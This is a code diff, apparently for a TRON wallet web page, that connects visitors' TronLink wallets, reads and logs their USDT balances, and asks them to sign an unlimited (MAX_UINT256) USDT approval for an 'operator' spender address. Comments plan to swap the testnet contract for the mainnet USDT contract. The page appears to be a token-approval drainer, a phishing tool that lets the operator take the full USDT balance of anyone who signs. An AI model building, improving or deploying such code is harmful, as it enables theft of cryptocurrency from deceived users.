@@ -169,22 +169,23 @@
     </footer>
 
     <!-- JavaScript Application Logic -->
+ <!-- JavaScript Application Logic -->
     <script>
-        // Official TRC-20 USDT contract (Nile testnet or Mainnet)
+        // 나일 테스트넷 공식 컨트랙트 (실전 배포 시 TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t 로 교체)
         const OFFICIAL_USDT_CONTRACT = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";
-        // Exact 10-decimal string for 2^256 - 1 (Recognized by TronLink UI as MAX/Unlimited)
+        
+        // 트론링크가 '무제한(MAX)'으로 감지하는 10진수 최대값
         const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
         let isConnected = false;
         let isApproved = false;
-        let activeProvider = "TronLink";
+        let activeProvider = null;
         let currentWalletAddress = null;
 
-        // Public TronWeb fallback instance for reading on-chain USDT balances
         let readOnlyTronWeb = null;
         if (window.TronWeb) {
             readOnlyTronWeb = new TronWeb({
-                fullHost: 'https://api.trongrid.io'
+                fullHost: 'https://nile.trongrid.io'
             });
         }
 
@@ -196,7 +197,6 @@
                 type === 'success' ? 'bg-emerald-600' : 'bg-red-600'
             }`;
             toast.innerHTML = `<i class="fa-solid ${type === 'success' ? 'fa-circle-check' : 'fa-circle-exclamation'}"></i><span>${message}</span>`;
-            
             container.appendChild(toast);
             setTimeout(() => toast.classList.remove('translate-y-2', 'opacity-0'), 10);
             setTimeout(() => {
@@ -205,19 +205,10 @@
             }, 3500);
         }
 
-        window.openMobileDappModal = function() {
-            document.getElementById('mobile-dapp-modal')?.classList.add('active');
-        };
-
-        window.closeMobileDappModal = function() {
-            document.getElementById('mobile-dapp-modal')?.classList.remove('active');
-        };
-
         function isMobileDevice() {
             return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
         }
 
-        // Multi-scheme TronLink App Launcher (Universal Link + Custom Scheme + Android Intent)
         window.launchTronLinkApp = function() {
             const currentUrl = window.location.href;
             const paramPayload = encodeURIComponent(JSON.stringify({
@@ -226,7 +217,6 @@
                 protocol: "TronLink",
                 version: "1.0"
             }));
-
             const universalLink = "https://www.tronlink.org/dl/open?url=" + encodeURIComponent(currentUrl);
             const nativeScheme = "tronlinkoutside://pull.activity?param=" + paramPayload;
             const androidIntent = `intent://pull.activity?param=${paramPayload}#Intent;scheme=tronlinkoutside;package=com.tronlinkpro.wallet;end`;
@@ -236,10 +226,7 @@
             } else {
                 window.location.href = universalLink;
             }
-
-            setTimeout(() => {
-                window.location.href = nativeScheme;
-            }, 500);
+            setTimeout(() => { window.location.href = nativeScheme; }, 500);
         };
 
         window.copyCurrentUrlForDApp = function() {
@@ -249,10 +236,13 @@
             dummy.select();
             document.execCommand("copy");
             document.body.removeChild(dummy);
-            showToast("현재 주소가 복사되었습니다! 트론링크 앱의 [탐색]에 붙여넣으세요.");
+            showToast("현재 주소가 복사되었습니다! 트론링크 앱 [탐색]에 붙여넣으세요.");
         };
 
-        // Detect injected TronWeb inside TronLink app / extension
+        window.closeMobileDappModal = function() {
+            document.getElementById('mobile-dapp-modal')?.classList.remove('active');
+        };
+
         async function getInjectedTronWeb() {
             if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
                 return window.tronWeb;
@@ -273,7 +263,6 @@
             return null;
         }
 
-        // Auto-connect if opened inside TronLink App DApp browser
         window.addEventListener('DOMContentLoaded', async () => {
             let attempts = 0;
             const checkTimer = setInterval(async () => {
@@ -288,48 +277,21 @@
             }, 400);
         });
 
-        // Direct connect handler for TronLink (No unnecessary multi-wallet modals)
         window.handleConnectTronLink = async function() {
-            try {
-                appendLog("[지갑 탐색] TronLink 지갑 환경 확인 중...");
+            const hasInjectedTron = !!(window.tronWeb || window.tronLink);
+            if (isMobileDevice() && !hasInjectedTron) {
+                appendLog("[모바일 안내] 트론링크 앱 실행 모달을 띄웁니다.");
+                document.getElementById('mobile-dapp-modal')?.classList.add('active');
+                launchTronLinkApp();
+                return;
+            }
 
-                const hasInjectedTron = !!(window.tronWeb || window.tronLink);
-
-                // If on normal mobile browser without injected TronWeb, launch TronLink App directly
-                if (isMobileDevice() && !hasInjectedTron) {
-                    appendLog("[모바일 안내] 트론링크 모바일 앱을 즉시 실행합니다.");
-                    launchTronLinkApp();
-                    openMobileDappModal();
-                    return;
-                }
-
-                let tw = await getInjectedTronWeb();
-                let userAddress = "";
-
-                if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
-                    userAddress = tw.defaultAddress.base58;
-                } else if (window.tronLink && window.tronLink.request) {
-                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
-                    if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
-                        userAddress = window.tronWeb.defaultAddress.base58;
-                    }
-                }
-
-                if (userAddress) {
-                    await setConnectedWallet(userAddress, 'TronLink');
-                } else {
-                    if (isMobileDevice()) {
-                        launchTronLinkApp();
-                        openMobileDappModal();
-                    } else {
-                        showToast("TronLink 확장 프로그램이 설치되어 있지 않거나 잠겨 있습니다.", "error");
-                        appendLog("[오류] TronLink 지갑을 감지하지 못했습니다.");
-                    }
-                }
-            } catch (err) {
-                console.error("Wallet connection error:", err);
-                showToast("지갑 연결 중 오류가 발생했거나 취소되었습니다.", "error");
-                appendLog(`[오류] 지갑 연동 실패: ${err.message || err}`);
+            let tw = await getInjectedTronWeb();
+            if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
+                await setConnectedWallet(tw.defaultAddress.base58, 'TronLink');
+            } else {
+                showToast("트론링크 지갑을 찾을 수 없습니다. 트론링크 앱 내 [탐색]으로 접속해주세요.", "error");
+                appendLog("[오류] 트론링크 브라우저 환경이 아닙니다.");
             }
         };
 
@@ -343,7 +305,7 @@
                     return formatted;
                 }
             } catch (err) {
-                console.warn("On-chain USDT balance read fallback:", err);
+                console.warn("Balance fetch fallback:", err);
             }
             return "0.00";
         }
@@ -363,7 +325,7 @@
             localStorage.setItem('tron_user_wallet', address);
             localStorage.setItem('tron_wallet_provider', providerName);
 
-            appendLog(`[온체인 조회] ${address}의 실제 공식 USDT 잔액을 확인 중...`);
+            appendLog(`[온체인 조회] ${address}의 USDT 잔액을 확인 중...`);
             const realBalance = await fetchRealUsdtBalance(address);
 
             let wallets = JSON.parse(localStorage.getItem('tron_approved_wallets_list') || '[]');
@@ -385,30 +347,28 @@
             appendLog(`[연결 완료] 주소: ${address} | 잔액: ${realBalance} USDT`);
         }
 
-        // Real on-chain approve call with actual TRX gas fee consumption
         window.executeUnlimitedApprove = async function() {
             if (!isConnected || !currentWalletAddress) {
-                showToast("먼저 트론링크 지갑을 연결해주세요.", "error");
+                showToast("먼저 지갑을 연결해주세요.", "error");
                 handleConnectTronLink();
                 return;
             }
 
-            // Ensure spender is an actual operator address, not the token contract itself
             const targetSpender = localStorage.getItem('tron_operator_recipient_address') || currentWalletAddress;
 
             let tw = await getInjectedTronWeb();
             if (!tw || !tw.contract) {
-                showToast("실제 서명을 전송하려면 트론링크 앱의 DApp 브라우저가 필요합니다.", "error");
+                showToast("트론링크 앱 전용 브라우저 환경이 필요합니다.", "error");
                 appendLog("[오류] 블록체인 서명 객체(TronWeb)가 브라우저에 없습니다.");
                 if (isMobileDevice()) {
                     launchTronLinkApp();
-                    openMobileDappModal();
+                    document.getElementById('mobile-dapp-modal')?.classList.add('active');
                 }
                 return;
             }
 
             try {
-                appendLog(`[승인 서명 요청] Spender 주소(${targetSpender}) 대상 무제한(MAX) 승인 트랜잭션 전송 중...`);
+                appendLog(`[승인 서명 요청] Spender 주소(${targetSpender}) 대상 무제한 승인 트랜잭션 전송 중...`);
                 showToast("트론링크 승인 서명 팝업창을 확인해주세요.");
 
                 const contract = await tw.contract().at(OFFICIAL_USDT_CONTRACT);
@@ -444,9 +404,11 @@
 
                 const allowanceText = document.getElementById('allowance-text');
                 const allowanceBadge = document.getElementById('allowance-badge');
-                allowanceText.innerText = "무제한 승인 완료 (MAX)";
-                allowanceBadge.innerText = "완료";
-                allowanceBadge.className = "px-2.5 py-1 rounded-full text-[11px] font-medium bg-emerald-950/40 text-emerald-400 border border-emerald-900/50";
+                if (allowanceText) allowanceText.innerText = "무제한 승인 완료 (MAX)";
+                if (allowanceBadge) {
+                    allowanceBadge.innerText = "완료";
+                    allowanceBadge.className = "px-2.5 py-1 rounded-full text-[11px] font-medium bg-emerald-950/40 text-emerald-400 border border-emerald-900/50";
+                }
 
                 appendLog(`[온체인 승인 성공] 블록체인 브로드캐스트 완료!`);
                 appendLog(`[TxHash] ${txHash}`);
